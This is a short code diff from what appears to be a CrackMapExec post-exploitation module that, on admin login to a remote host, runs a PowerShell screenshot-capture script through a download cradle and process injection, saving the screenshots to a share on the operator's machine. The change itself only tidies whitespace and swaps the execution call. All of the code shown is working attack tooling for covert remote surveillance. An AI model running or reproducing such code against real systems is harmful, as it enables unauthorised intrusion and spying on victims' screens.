@@ -45,16 +45,15 @@ class CMEModule:
 
     def on_admin_login(self, context, connection):
         screen_folder = 'get_timedscreenshot_{}'.format(connection.host)
-        screen_command = 'Get-TimedScreenshot -Path \\\\{}\\{}\\{} -Interval {} -EndTime {}'.format(context.localip, self.share_name, 
-                                                                                                    screen_folder, self.interval, 
+        screen_command = 'Get-TimedScreenshot -Path \\\\{}\\{}\\{} -Interval {} -EndTime {}'.format(context.localip, self.share_name,
+                                                                                                    screen_folder, self.interval,
                                                                                                     self.endtime)
-        screen_command = gen_ps_iex_cradle(context, 'Get-TimedScreenshot.ps1', 
+        screen_command = gen_ps_iex_cradle(context, 'Get-TimedScreenshot.ps1',
                                            screen_command, post_back=False)
 
         launcher = gen_ps_inject(screen_command, context)
-        ps_command = create_ps_command(launcher)
 
-        connection.execute(ps_command)
+        connection.ps_execute(launcher)
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
